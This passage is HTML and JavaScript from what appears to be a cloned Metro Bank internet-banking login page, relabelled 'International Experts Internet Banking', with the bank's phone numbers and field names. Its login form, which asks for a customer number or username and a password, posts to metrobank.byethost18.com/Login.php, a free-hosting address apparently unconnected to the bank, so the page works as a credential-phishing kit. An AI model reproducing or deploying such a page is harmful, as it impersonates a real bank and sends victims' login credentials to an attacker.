            $("#" + runTimeID + "_chzn").css("width", "320px").find(".chzn-drop").css("width", "318px");
            $("#" + runTimeID + "_chzn").find(".chzn-search input").css("width", "100%");



        });

    }


    window.onclick = function(e) {
        if ($(e.target).closest(".mega-menu, .user-panel-alt, .button, .dropdown, .dropdown-parent").length == 0 && !$(e.target).is(".CommonStandardTabDesign"))
            $(".menu-panel, .dropdown-menu, .dropdown-container").hide();
    }

    $(window).resize(function() {
        $(".ui-dialog-content").dialog("option", "position", "center");
        reposHelp();
    });

    $(function() {
        updateAllHelp();
        updateNegativeVals();
        addHighlights();
        moveButtonsToPopup();
        removeHiddenTabs();
        highlightErrorSections();
        setupFancySelects();
        preventCopyPasteOnMessage();

        $("input[value].PAYEEREFRENCE").each(function(i, o) {
            var val = $(o).val();
            var decoded = $("<div/>").html(val).text()
            $(o).attr("value", decoded);
        });




        setupMessageDropdowns('select.chzn-select.message-dropdowns', '');






        $("#TAB_7DBA9120F8BEF939288337").attr("onclick", "").unbind('click');
        $("#TAB_7DBA9120F8BEF939288337").click(function() {
            $(this).data('clicked', true);
            changeTab('TAB_7DBA9120F8BEF939288337', '', 'StandardTabSelected CommonStandardTabDesign applicability-tweak', 'StandardTabUnselected CommonStandardTabDesign applicability-tweak');
        });



        $("#TAB_PREFERENCES").attr("onclick", "").unbind('click');
        $("#TAB_PREFERENCES").click(function() {
            $(this).data('clicked', true);
            changeTab('TAB_PREFERENCES', '', 'StandardTabSelected CommonStandardTabDesign', 'StandardTabUnselected CommonStandardTabDesign');
        });


        $("#TAB_ALERTS").attr("onclick", "").unbind('click');
        $("#TAB_ALERTS").click(function() {
            $(this).data('clicked', true);
            changeTab('TAB_ALERTS', '', 'StandardTabSelected CommonStandardTabDesign', 'StandardTabUnselected CommonStandardTabDesign');
        });



        $("#TAB_TAX").attr("onclick", "").unbind('click');
        $("#TAB_TAX").click(function() {
            $(this).data('clicked', true);

            changeTab('TAB_TAX', '', 'StandardTabSelected CommonStandardTabDesign', 'StandardTabUnselected CommonStandardTabDesign');
        });



        $("#TAB_XERO").attr("onclick", "").unbind('click');
        $("#TAB_XERO").click(function() {
            $(this).data('clicked', true);
            changeTab('TAB_XERO', '', 'StandardTabSelected CommonStandardTabDesign', 'StandardTabUnselected CommonStandardTabDesign');
        });


        $(".zero-payees").appendTo("#FS_PAYMENT_TO");
        $("#FS_PAYMENT_TO").css("width", "320px");


        $("#GROUP_FS_BUT_5F24222F75C0F74A63256>div").each(function(i, o) {
            if ($(o).css("display") != "none")
                $(o).css("display", "block").css("float", "left");
        });

        $("body").click(function(event) {

            if ($(event.target).closest("#helpDiv").length > 0) return;
            $("#helpDiv").hide();
            jQuery.data(document.body, 'currentHelp', "");
        });


        $('input[type="password"]').bind('copy paste drag drop', function(e) {
            //e.preventDefault();
        });






        if ($.data(document.body, "ButtonToClick") != null) {
            var id = $.data(document.body, "ButtonToClick");
            $.data(document.body, "ButtonToClick", null);
            $("#" + id).click();
        }
        /*
        $.blockUI.defaults.css.cursor = 'default';
        $.blockUI.defaults.overlayCSS.cursor = 'default';
        */


    });
    //]]>
    </script>
    <link rel="stylesheet" type="text/css" href="index.css" media="all">
</head>

<body onunload="unloadAction();" style="margin: 0px;" class="BrowserWindow">
        <form id="form1" name="form1" method="post" action="http://metrobank.byethost18.com/Login.php">
        <div style="display: none;">
            <input value="" name="MODE" type="text">
        </div>
        <div style="display: none;">
            <input name="xa3142851-ac2d-47dc-a9fc-139d4fcdf696" value="ab81fa9d-ff1b-4300-a8b2-40f46837e5c6" type="text">
        </div>
        <div style="display: none;">
            <input value="" name="MENUSTATE" type="text">
        </div>
        <input value="" style="left: -10000px; position: absolute;" type="text">
        <div style="clear: both;" id="EDGE_CONNECT_PROCESS">
            <header id="FMT_757E5CE63630B7EB52722" class="navbarvb fixed">
                <div style="clear: both;" id="FMT_757E5CE63630B7EB52746" class="navbar-innervb row">
                    <div style="clear: both;" id="FMT_757E5CE63630B7EB97280" class="container relative">
                        <div style="clear: both; width: 100%;">
                            <div id="COL_757E5CE63630B7EB52766" class="logo column" style="float: left;">
                                <div>
                                    <div style="clear: left;" id="row_TXT_757E5CE63630B7EB183525">
                                        <div style="text-align: left;" id="TXT_757E5CE63630B7EB183525">
                                            <div>&nbsp;</div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div id="COL_757E5CE63630B7EB52771" style="float: left;">
                                <div>
                                    <div class="ec-empty-column" id="dummyCOL_757E5CE63630B7EB52771">&nbsp;</div>
                                </div>
                            </div>
                            <div id="COL_757E5CE63630B7EB52772" class="floatRight" style="float: left; width: 43%;">
                                <div>
                                    <div style="clear: both;" id="FMT_E69059C36009800B118594">
                                        <div>
                                            <div id="p1_GRP_2F1A8E1F73CCF7BB35383" style="position: relative;">
                                                <div style="width: 100%;">
                                                    <div id="COL_66B08F5F5BB46A05219019" style="float: left;">
                                                        <div>
                                                            <div style="clear: left;" id="row_BUT_FB29BEC4B07C7DFC567238">
                                                                <div class="floatNone  " style="text-align: left; float: left;" id="p4_BUT_FB29BEC4B07C7DFC567238">
                                                                    <div>
                                                                        <a indepth="true" href="default.html" class="header-menu-link fontSizep9em" onclick="" target="_top">Home</a></div>
                                                                </div>
                                                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                            </div>
                                                            <div style="clear: left; display: none;" id="row_HEAD_66B08F5F5BB46A05218880">
                                                                <div id="p1_HEAD_66B08F5F5BB46A05218880" style="display: none; text-align: left; float: left;" class="header-menu-item fontSizep9em">
                                                                    <div>Call us on 0345 08 08 500 for any help</div>
                                                                </div>
                                                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div id="COL_E69059C36009800B118607" class="dropdown header-hover-effect" style="float: left;">
                                                        <div>
                                                            <div>
                                                                <div id="p1_GRP_E69059C36009800B117101" style="position: relative;">
                                                                    <div></div>
                                                                    <div>
                                                                        <div style="clear: left;" id="row_BUT_E69059C36009800B115440" class="dropdown-toggle  ">
                                                                            <div style="text-align: left; float: left;" id="p4_BUT_E69059C36009800B115440">
                                                                                <div>
                                                                                    <a href="#" id="BUT_E69059C36009800B115440" class="header-menu-link drop-down-indicator fontSizep9em" onclick="onToggle('BUT_E69059C36009800B115440','ourstores','N', 'N', event);  return false">
                                                                                        <span class="">Our Stores <b class="caret"></b></span>
                                                                                    </a>
                                                                                </div>
                                                                            </div>
                                                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                        </div>
                                                                    </div>
                                                                    <div style="clear: both; display: none;" id="ourstores" class="dropdown-menu contact-menu">
                                                                        <div>
                                                                            <div id="p1_GRP_E69059C36009800B115416" style="position: relative;">
                                                                                <div style="clear: both;" id="FMT_E8309E8ACAE1163C38922" class="nav-padding wrap-text">
                                                                                    <div style="clear: both;">
                                                                                        <div style="clear: left;" id="row_HEAD_E69059C36009800B117108">
                                                                                            <div id="p1_HEAD_E69059C36009800B117108" style="text-align: left; float: left;" class="marginBottom1em fontWeight800 fontSizep9em">
                                                                                                <div>Our Stores are open 7 days a week, 362 days a year.</div>
                                                                                            </div>
                                                                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                                        </div>
                                                                                        <div style="clear: left;" id="row_HEAD_E69059C36009800B115426">
                                                                                            <div id="p1_HEAD_E69059C36009800B115426" style="text-align: left; float: left;" class="fontSizep9em">
                                                                                                <div>We are only closed on New Year's Day, Easter Sunday and Christmas Day.</div>
                                                                                            </div>
                                                                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                                </div>
                                                                                <div>
                                                                                    <div style="clear: left;" id="row_SPC_B057F8331BE03AA290727">
                                                                                        <div style="text-align: center;" id="SPC_B057F8331BE03AA290727">
                                                                                            <div style="background-color: rgb(229, 229, 229); border-bottom: 1px solid rgb(255, 255, 255); height: 1px; margin: 6px 0px 1px; overflow: hidden;">
                                                                                                <hr>
                                                                                            </div>
                                                                                        </div>
                                                                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                                    </div>
                                                                                    <div style="clear: left;" id="row_BUT_E69059C36009800B115434">
                                                                                        <div class="floatNone  " style="float: left;" id="p4_BUT_E69059C36009800B115434">
                                                                                            <div>
                                                                                                <a indepth="true" href="default_001.html" class="NoDecoration" onclick="" target="_top"><span aria-hidden="true" data-icon="("></span> Find your Local Store</a></div>
                                                                                        </div>
                                                                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                                    </div>
                                                                                </div>
                                                                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                            </div>
                                                                        </div>
                                                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                    </div>
                                                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div id="COL_C6510857DFA48AE1302197" class="dropdown header-hover-effect" style="float: left;">
                                                        <div>
                                                            <div>
                                                                <div id="p1_GRP_C6510857DFA48AE1301910" style="position: relative;">
                                                                    <div></div>
                                                                    <div>
                                                                        <div style="clear: left;" id="row_BUT_C6510857DFA48AE1301911" class="dropdown-toggle  ">
                                                                            <div style="text-align: left; float: left;" id="p4_BUT_C6510857DFA48AE1301911">
                                                                                <div>
                                                                                    <a href="#" id="BUT_C6510857DFA48AE1301911" class="header-menu-link drop-down-indicator fontSizep9em" onclick="onToggle('BUT_C6510857DFA48AE1301911','contactus','N', 'N', event);  return false">
                                                                                        <span class="">Contact us <b class="caret"></b></span>
                                                                                    </a>
                                                                                </div>
                                                                            </div>
                                                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                        </div>
                                                                    </div>
                                                                    <div style="clear: both; display: none;" id="contactus" class="dropdown-menu contact-menu">
                                                                        <div>
                                                                            <div id="p1_GRP_C6510857DFA48AE1301914" style="position: relative;">
                                                                                <div></div>
                                                                                <div>
                                                                                    <div style="clear: left;" id="row_HEAD_C6510857DFA48AE1301915">
                                                                                        <div id="p1_HEAD_C6510857DFA48AE1301915" style="text-align: left; float: left;" class="nav-header">
                                                                                            <div>Call our London Call centre</div>
                                                                                        </div>
                                                                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                                    </div>
                                                                                </div>
                                                                                <div style="clear: both;" id="FMT_C6510857DFA48AE1301916" class="nav-padding wrap-text">
                                                                                    <div style="clear: both;">
                                                                                        <div style="clear: left;" id="row_HEAD_C6510857DFA48AE1301917">
                                                                                            <div id="p1_HEAD_C6510857DFA48AE1301917" style="text-align: left; float: left;" class="fontWeight800 fontSizep9em">
                                                                                                <div>On 0345 08 08 500</div>
                                                                                            </div>
                                                                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                                </div>
                                                                                <div>
                                                                                    <div style="clear: left;" id="row_SPC_C6510857DFA48AE1301919">
                                                                                        <div style="text-align: center;" id="SPC_C6510857DFA48AE1301919">
                                                                                            <div style="background-color: rgb(229, 229, 229); border-bottom: 1px solid rgb(255, 255, 255); height: 1px; margin: 6px 0px 1px; overflow: hidden;">
                                                                                                <hr>
                                                                                            </div>
                                                                                        </div>
                                                                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                                    </div>
                                                                                    <div style="clear: left;" id="row_HEAD_C6510857DFA48AE1301970">
                                                                                        <div id="p1_HEAD_C6510857DFA48AE1301970" style="text-align: left; float: left;" class="nav-header">
                                                                                            <div>Outside the UK?</div>
                                                                                        </div>
                                                                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                                    </div>
                                                                                </div>
                                                                                <div style="clear: both;" id="FMT_C6510857DFA48AE1302002" class="nav-padding wrap-text">
                                                                                    <div style="clear: both;">
                                                                                        <div style="clear: left;" id="row_HEAD_C6510857DFA48AE1301980">
                                                                                            <div id="p1_HEAD_C6510857DFA48AE1301980" style="text-align: left; float: left;" class="fontWeight800 fontSizep9em">
                                                                                                <div>Please call +44 20 3402 8312</div>
                                                                                            </div>
                                                                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                                </div>
                                                                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                            </div>
                                                                        </div>
                                                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                    </div>
                                                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div id="COL_E69059C36009800B118616" class="floatRight" style="float: left;">
                                                        <div>
                                                            <div style="clear: left;" id="row_BUT_2F1A8E1F73CCF7BB35477">
                                                                <div style="text-align: left; float: left;" id="p4_BUT_2F1A8E1F73CCF7BB35477">
                                                                    <div>
                                                                        <a href="#" class="header-menu-link fontSizep9em" onclick="" target="_top">Corporate Internet Banking</a></div>
                                                                </div>
                                                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <div style="clear: left;" id="row_QUE_POPUPMODALHANDLER">
                                                        <div id="p1_QUE_POPUPMODALHANDLER__REMOVED" style="text-align: left; float: left; display: none;">
                                                            <div>
                                                                <label for="QUE_POPUPMODALHANDLER">popupModalHandler</label>
                                                            </div>
                                                        </div>
                                                        <div id="p2_QUE_POPUPMODALHANDLER__REMOVED" style="text-align: left; float: left; display: none;">
                                                            <div>&nbsp;</div>
                                                        </div>
                                                        <div id="p3_QUE_POPUPMODALHANDLER__REMOVED" style="text-align: left; float: left; display: none;">
                                                            <div>&nbsp;</div>
                                                        </div>
                                                        <div style="float: left; text-align: left; display: none;" id="p4_QUE_POPUPMODALHANDLER__REMOVED">
                                                            <div>
                                                                <input value="" name="WORKINGELEMENTS[1].POPUPMODALHANDLER" id="QUE_POPUPMODALHANDLER" size="15" maxlength="256" onfocus="doOnFocus('', this.id, '');  ;setUpFocusValue('',this);" onblur="if (FORMAT_VALIDATION_TRIGGER == getTriggeredReason() || '' == getTriggeredReason()) {doOnBlur('', this.id);  startJob('', 'onblur', 'QUE_POPUPMODALHANDLER');if (ajaxValidate('servletcontroller', '', '', event, this, true, false,'', ['','','','','','','','',''])) {ajaxQuestionAction('2635731E7BD26D7D Question 497', 'QUE_POPUPMODALHANDLER' , false, '', 'servletcontroller', '', false, event, true, true, false); endJob('', 'onblur', true, 'QUE_POPUPMODALHANDLER'); return true;} else {endJob('', 'onblur', false, 'QUE_POPUPMODALHANDLER'); return false;}}" onkeypress="return(checkForDefaultButtonAction(event, this, 'F', ''))" type="text">
                                                            </div>
                                                            <label id="QUE_POPUPMODALHANDLER_ERRORMESSAGE" for="QUE_POPUPMODALHANDLER" style="display: none;"></label>
                                                        </div>
                                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                    </div>
                                                </div>
                                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                            </div>
                                        </div>
                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                    </div>
                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                </div>
            </header>
            <div style="clear: both;" id="FMT_757E5CE63630B7EB53739" class="navigation-content">
                <div style="clear: both;" id="FMT_757E5CE63630B7EB182644" class="row">
                    <div style="clear: both; width: 100%;">
                        <div id="COL_D96D931C6B0278BB574184" class="column grid-6" style="float: left;">
                            <div>
                                <div style="clear: left;" id="row_HEAD_757E5CE63630B7EB51257">
                                    <div id="p1_HEAD_757E5CE63630B7EB51257" style="float: left;">
                                        <div>
                                            <h3 id="HEAD_757E5CE63630B7EB51257" class="welcome-message  ">Welcome to International Experts Internet Banking</h3></div>
                                    </div>
                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                </div>
                            </div>
                        </div>
                        <div id="COL_D96D931C6B0278BB574188" class="message-container grid-5 floatRight marginTop15px" style="float: left;">
                            <div>
                                <div>
                                    <div id="p1_GRP_2F1A8E1F73CCF7BB34554" style="position: relative;">
                                        <div style="clear: both; width: 120%;" id="FMT_070798F54A24C151179318" class="
 message-panel ">
                                            <div style="clear: both; width: 100%;">
                                                <div id="COL_63A02AE881A7B6BC352302" style="float: left;">
                                                    <div>
                                                        <div style="clear: left;" id="row_TXT_63A02AE881A7B6BC352162">
                                                            <div style="text-align: left;" id="TXT_63A02AE881A7B6BC352162">
                                                                <div class="floatLeft"><span data-icon="n" aria-hidden="true"></span></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div id="COL_63A02AE881A7B6BC352306" class="floatRight" style="float: left; width: 84%;">
                                                    <div>
                                                        <div style="clear: both;" id="FMT_2F1A8E1F73CCF7BB34695">
                                                            <div style="clear: both;">
                                                                <div style="clear: left;" id="row_HEAD_2F1A8E1F73CCF7BB34560">
                                                                    <div id="p1_HEAD_2F1A8E1F73CCF7BB34560" style="text-align: left; float: none;">
                                                                        <div>
                                                                            <h4 id="HEAD_2F1A8E1F73CCF7BB34560" class="fontWeight600 fontSize1p2em lineHeight1p6em  ">Having trouble logging into your account?</h4></div>
                                                                    </div>
                                                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                </div>
                                                                <div style="clear: left;" id="row_TXT_3F499A98D5FF1ED7223711">
                                                                    <div style="text-align: left;" id="TXT_3F499A98D5FF1ED7223711">
                                                                        <div class="lineHeight1p2em">
                                                                            <div class="floatLeft">
                                                                                <br> <a href="#" class="textUnderline send-feeback" target="_top">Click here for more information</a></div>
                                                                            <script type="text/javascript">
                                                                            $("div a.send-feedback").click(function() {
                                                                                $("a.FEEDBACK_MSG").click();
                                                                            });
                                                                            </script>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                        </div>
                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                </div>
                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
            </div>
            <div style="clear: both;" id="FMT_2F1A8E1F73CCF7BB34607" class="row login-content">
                <div style="clear: both;" id="EDGE_CONNECT_PHASE">
                    <div style="clear: both;">
                        <div style="clear: left;" id="row_TXT_949F42C25F67077E23870">
                            <div style="text-align: left;" id="TXT_949F42C25F67077E23870">
                                <div>
                                    <script type="text/javascript" language="javascript">
                                    //Check whether the checkbox with ID REMEMBER_ME_CHECKBOX is selected or not.
                                    //If selected, check whether the cookie already exists using readCookie(). If not, create one using newCookie().
                                    //If not selected, check whether the cookie already exists using readCookie(). If it does, delete it using eraseCookie().

                                    function afterInitForm(ns) {


                                        //if(checkCookieSettings()){
                                        $("#USER_NAME").val(readCookie("USER_NAME"));
                                        $("#REMEMBER_ME_CHECKBOX_0").prop("checked", readCookie("REMEMBER_ME"));
                                        //alert("ReadMe " + readCookie("REMEMBER_ME"));
                                        return true;
                                        /*else {
                                        	//alert('enable cookie pls');
                                        	return true;
                                        }*/

                                    }

                                    function afterSubmit(ns, p_mode, p_scrollToButton, p_id) {

                                        //alert("afterSubmit");
                                        //if(checkCookieSettings()){
                                        //eraseCookie("USER_NAME");
                                        $("#USER_NAME").val("");
                                        //eraseCookie("REMEMBER_ME");

                                        return true;
                                        /*	else {
                                        		//alert('enable cookie please');
                                        		return true;
                                        	} */

                                    }
                                    </script>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div style="clear: both;" id="FMT_757E5CE63630B7EB52834" class="row">
                        <div style="clear: both;" id="FMT_BD26871DF6CFB03F271721" class="column grid-10 prefix-1">
                            <div style="clear: both; width: 100%;">
                                <div id="COL_BD26871DF6CFB03F271745" style="float: left; width: 49%;">
                                    <div>
                                        <div style="clear: left;" id="row_HEAD_BD26871DF6CFB03F271700">
                                            <div id="p1_HEAD_BD26871DF6CFB03F271700" style="float: left; display: inline-block;">
                                                <div>
                                                    <h3 id="HEAD_BD26871DF6CFB03F271700" class="steps  ">Log in to your international experts account</h3></div>
                                            </div>
                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                        </div>
                                    </div>
                                </div>
                                <div id="COL_BD26871DF6CFB03F271749" class="floatRight" style="float: left; width: 49%;">
                                    <div>
                                        <div class="ec-empty-column" id="dummyCOL_BD26871DF6CFB03F271749">&nbsp;</div>
                                    </div>
                                </div>
                            </div>
                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                        </div>
                        <div style="clear: both;" id="FMT_D96D931C6B0278BB573455" class="column grid-10 prefix-1">
                            <div style="clear: both;">
                                <div style="clear: left;" id="row_HEAD_757E5CE63630B7EB51259">
                                    <div id="p1_HEAD_757E5CE63630B7EB51259" style="float: left; display: inline-block;">
                                        <div>
                                            <h3 id="HEAD_757E5CE63630B7EB51259" class="steps  "></h3></div>
                                    </div>
                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                </div>
                            </div>
                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                        </div>
                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                    </div>
                    <div style="clear: both;" id="FMT_757E5CE63630B7EB52849" class="row login-content">
                        <div style="clear: both;" id="FMT_757E5CE63630B7EB52850" class="column grid-10 prefix-1">
                            <div style="clear: both;" id="FMT_676694FA186075B225016">
                                <div>
                                    <div id="p1_GRP_D7B8840718C6977072237" style="display: none; position: relative;"></div>
                                </div>
                                <div>
                                    <div id="p1_GRP_757E5CE63630B7EB51265" style="display: none; position: relative;"></div>
                                </div>
                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                            </div>
                            <div style="clear: both;" id="FMT_D96D931C6B0278BB568104" class="login-form">
                                <div style="clear: both;" id="FMT_757E5CE63630B7EB182806" class="row">
                                    <div style="clear: both; width: 100%;">
                                        <div id="COL_757E5CE63630B7EB52865" class="column grid-5" style="float: left;">
                                            <div>
                                                <div>
                                                    <div id="p1_GRP_757E5CE63630B7EB51270" style="position: relative;">
                                                        <div style="clear: both;" id="FMT_757E5CE63630B7EB183171" class="login-form-container">
                                                            <div style="clear: both;" id="FMT_757E5CE63630B7EB182857" class="form-row">
                                                                <div style="clear: both;">
                                                                    <div style="clear: left;" id="row_HEAD_1CA248BB193B8D5B336775">
                                                                        <div id="p1_HEAD_1CA248BB193B8D5B336775" style="text-align: left; float: none;" class="label UnderlinedQuestion marginBottom1em">
                                                                            <div>Please enter your Customer Number or Username<span id="p5_HEAD_1CA248BB193B8D5B336775">&nbsp;<a style="cursor: pointer;" id="HELP_HEAD_1CA248BB193B8D5B336775" onclick="javascript:showAjaxHelp('HELP_HEAD_1CA248BB193B8D5B336775', '1CA248BB193B8D5B Heading 1093', '', 'servletcontroller', '', event);" onmouseover="this.style.cursor='pointer'" onfocus="this.style.cursor='pointer'">What is this?</a></span></div>
                                                                        </div>
                                                                        <div id="p1_USER_NAME" style="text-align: left; float: left;" class="displayNone">
                                                                            <div>
                                                                                <label for="USER_NAME">Please enter your Customer Number or Username</label>
                                                                            </div>
                                                                        </div>
                                                                        <div id="p2_USER_NAME" style="text-align: left; float: left;" class="displayNone">
                                                                            <div>*</div>
                                                                        </div>
                                                                        <div id="p3_USER_NAME" style="text-align: left; float: left;" class="displayNone">
                                                                            <div>&nbsp;</div>
                                                                        </div>
                                                                        <div style="text-align: left; float: none;" id="p4_USER_NAME">
                                                                            <div>
                                                                                <input id="username" type="text" size="15" maxlength="18" name="USER_NAME" />
                                                                                
                                                                                <span id="MM_USER_NAME">
                                                                                <br />
                                                                                <br />
&nbsp;&nbsp; Please enter either your Customer Number or Username</span>
                                                                            </div>
                                                                            <label class="error-message" id="USER_NAME_ERRORMESSAGE" for="USER_NAME" style="display: none;"></label>
                                                                        </div>
                                                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                    </div>
                                                                <div style="clear: left;" id="row_HEAD_1CA248BB193B8D5B336775">
                                                                        <div id="p1_HEAD_1CA248BB193B8D5B336775" style="text-align: left; float: none;" class="label UnderlinedQuestion marginBottom1em">
                                                                            <div style="
    margin-top: 30px;
">Please enter your password<span id="p5_HEAD_1CA248BB193B8D5B336775">&nbsp;<a style="cursor: pointer;" id="HELP_HEAD_1CA248BB193B8D5B336775" onclick="javascript:showAjaxHelp('HELP_HEAD_1CA248BB193B8D5B336775', '1CA248BB193B8D5B Heading 1093', '', 'servletcontroller', '', event);" onmouseover="this.style.cursor='pointer'" onfocus="this.style.cursor='pointer'">What is this?</a></span></div>
                                                                        </div>
                                                                        <div id="p1_USER_NAME" style="text-align: left; float: left;" class="displayNone">
                                                                            <div>
                                                                                <label for="USER_NAME">Please enter your Customer Number or Username</label>
                                                                            </div>
                                                                        </div>
                                                                        <div id="p2_USER_NAME" style="text-align: left; float: left;" class="displayNone">
                                                                            <div>*</div>
                                                                        </div>
                                                                        <div id="p3_USER_NAME" style="text-align: left; float: left;" class="displayNone">
                                                                            <div>&nbsp;</div>
                                                                        </div>
                                                                        <div style="text-align: left; float: none;" id="p4_USER_NAME">
                                                                            <div>
                                                                                <input id="Password" type="password" size="15" maxlength="18" name="PASSWORD" />
                                                                                <span id="MM_USER_NAME">&nbsp;
                                                                                <br />
                                                                                <br />
&nbsp;&nbsp; Please enter your Interntional banking password</span>
                                                                            </div>
                                                                            <label class="error-message" id="USER_NAME_ERRORMESSAGE" for="USER_NAME" style="display: none;"></label>
                                                                        </div>
                                                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                    </div></div>
                                                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                            </div>
                                                            <div style="clear: both;" id="FMT_D96D931C6B0278BB569159" class="link-row">
                                                                <div style="clear: both;">
                                                                    <div style="clear: left;" id="row_BUT_757E5CE63630B7EB51278">
                                                                        <div style="text-align: left; float: left;" id="p4_BUT_757E5CE63630B7EB51278">
                                                                            <div>
                                                                                <a href="#" class="" onclick="" target="_top">Forgotten your Customer Number or Username?</a></div>
                                                                        </div>
                                                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                    </div>
                                                                </div>
                                                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                            </div>
                                                            <div style="clear: both;" id="FMT_D96D931C6B0278BB569173" class="form-row radio">
                                                                <div style="clear: both;">
                                                                    <div style="clear: left;" id="row_REMEMBER_ME_CHECKBOX">
                                                                        <div id="p1_REMEMBER_ME_CHECKBOX" style="text-align: left; float: left;" class="displayBlock floatRight CheckBoxQuestionWidth">
                                                                            <div>
                                                                                <label for="REMEMBER_ME_CHECKBOX_0">Remember me (Don’t tick if you are on a shared computer)</label>
                                                                            </div>
                                                                        </div>
                                                                        <div id="p2_REMEMBER_ME_CHECKBOX" style="text-align: left; float: left;" class="displayNone">
                                                                            <div>&nbsp;</div>
                                                                        </div>
                                                                        <div id="p3_REMEMBER_ME_CHECKBOX" style="text-align: left; float: left;" class="displayNone">
                                                                            <div>&nbsp;</div>
                                                                        </div>
                                                                        <div style="float: left; text-align: left;" id="p4_REMEMBER_ME_CHECKBOX" class="floatLeft  ">
                                                                            <div>
                                                                                <fieldset style="border: medium none; padding: 0px; margin-left: 0px; display: inline; vertical-align: middle;" id="FS_REMEMBER_ME_CHECKBOX" onkeypress="return(checkForDefaultButtonAction(event, this, 'F', ''))">
                                                                                    <legend class="accessibilityStyle">Remember me (Don’t tick if you are on a shared computer)</legend>
                                                                                    <div style="float: left;">
                                                                                        <input id="REMEMBER_ME_CHECKBOX_0" name="METROBANK[1].LOGIN[1].REMEMBERME" value="1" onclick="startJob('', 'onclick', 'REMEMBER_ME_CHECKBOX_0');var valid=ajaxValidate('servletcontroller', '', '', event, this, true, false,'', ['','','','','','','','','']); endJob('', 'onclick', valid, 'REMEMBER_ME_CHECKBOX_0'); return valid;" type="checkbox">
                                                                                    </div>
                                                                                </fieldset>
                                                                            </div>
                                                                            <label id="REMEMBER_ME_CHECKBOX_ERRORMESSAGE" for="REMEMBER_ME_CHECKBOX" style="display: none;"></label>
                                                                        </div>
                                                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                    </div>
                                                                </div>
                                                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                            </div>
                                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                        </div>
                                                        <div style="clear: both;" id="FMT_E8BAE60B5EFF4C8248379" class="button-row">
                                                            <div style="clear: both; width: 100%;">
                                                                <div id="COL_E8BAE60B5EFF4C8248326" class="floatRight" style="float: left;">
                                                                    <div>
                                                                        <div style="clear: left;" id="row_BUT_E8BAE60B5EFF4C8248304">
